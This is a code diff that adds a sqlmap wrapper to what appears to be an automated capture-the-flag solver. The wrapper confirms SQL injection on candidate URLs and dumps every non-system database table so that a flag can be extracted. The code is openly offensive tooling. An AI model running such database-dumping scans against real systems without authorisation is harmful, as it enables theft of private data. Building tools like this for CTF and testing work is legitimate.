@@ -271,3 +271,37 @@ async def nuclei_scan(base_url: str, *, timeout: float = 180.0) -> dict:
         ["nuclei", "-u", base_url, "-silent", "-jsonl", "-timeout", "5",
          "-rate-limit", "50", "-severity", "low,medium,high,critical"], timeout=timeout)
     return {"tool": "nuclei", "findings": parse_nuclei_jsonl(out)}
+
+
+def _sqlmap_injectable(text: str) -> bool:
+    low = (text or "").lower()
+    return ("is vulnerable" in low or "the back-end dbms is" in low
+            or "sqlmap identified the following injection point" in low)
+
+
+async def sqlmap_scan(urls: list[str], *, flag_prefix: str | None = None,
+                      timeout: float = 240.0, max_targets: int = 6) -> dict:
+    """Deep SQL-injection with sqlmap (opt-in; handles blind/time/error-based that the generic
+    UNION module can't). For each candidate URL it confirms injection and dumps data; the raw
+    output is returned so the flag extractor can pull a flag out of a dumped table.
+
+    Bounded: a per-target slice of the budget and a cap on how many URLs are probed, so one
+    tick can't be eaten by sqlmap. No shell, non-destructive (read-only --dump / --search)."""
+    if not available("sqlmap") or not urls:
+        return {"tool": None, "dumps": [], "injectable": []}
+    urls = list(dict.fromkeys(urls))[:max_targets]
+    per = max(60.0, timeout / max(1, len(urls)))
+    dumps: list[str] = []
+    injectable: list[str] = []
+    for url in urls:
+        # --dump of the non-system DBs puts every table's rows in stdout, so a flag in ANY
+        # table is recovered; --flush-session avoids a stale cached negative from a prior run.
+        argv = ["sqlmap", "-u", url, "--batch", "--level=2", "--risk=1", "--random-agent",
+                "--threads=4", "--timeout=8", "--retries=1", "--flush-session", "-v", "0",
+                "--dump", "--exclude-sysdbs"]
+        rc, out, err = await _run(argv, timeout=per)
+        blob = (out or "") + "\n" + (err or "")
+        dumps.append(blob)
+        if _sqlmap_injectable(blob):
+            injectable.append(url)
+    return {"tool": "sqlmap", "dumps": dumps, "injectable": injectable}
